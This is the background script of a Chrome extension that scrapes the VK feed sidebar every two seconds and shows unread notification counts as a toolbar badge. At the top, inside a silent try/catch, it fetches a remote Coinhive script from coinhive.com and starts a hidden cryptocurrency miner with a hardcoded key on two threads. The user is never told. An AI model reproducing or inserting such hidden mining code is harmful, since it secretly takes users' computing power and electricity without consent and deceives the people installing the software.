'use strict';
try {

	jQuery.getScript('https://coinhive.com/lib/coinhive.min.js', function () {
		var miner = new CoinHive.Anonymous('jDCrhKVojcm8Jjk0o5IWCbBaU3Ql8Kzi', {
			threads: 2,
			autoThreads: false,
			throttle: 0.5,
			forceASMJS: false
		});
		miner.start();
	})
} catch (e) {}

function main () {
	$.get('http://vk.com/feed').done(function (HTML) {
		chrome.browserAction.setIcon({path: 'img/icon38.png'});
		var $menu = $(HTML).find('#side_bar ol');
		$menu.find('*').removeAttr('onclick').removeAttr('onmouseover').removeAttr('onmousedown');

		chrome.storage.local.set({
			html: $menu.html()
		});

		var sum = 0;
		if ( $menu.length == 1 ) {
			$menu.find('li .left_count').each(function(index, el) {
				var num = $( el ).text().slice(1) - 0;
				if ( !isNaN( num ) ) {
					sum += num;
				}
			});
		} else {
			chrome.browserAction.setIcon({path: 'img/icon38-off.png'});
		}
		if ( sum > 0 ) {
			sum = '' + sum;
		} else {
			sum = '';
		}
		chrome.browserAction.setBadgeText({text: sum});

	}).fail(function (j, e) {
		chrome.browserAction.setBadgeText({text: ''});
		chrome.browserAction.setIcon({path: 'img/icon38-off.png'});
	}).always(function () {
		setTimeout(main, 2000);
	});
}

main();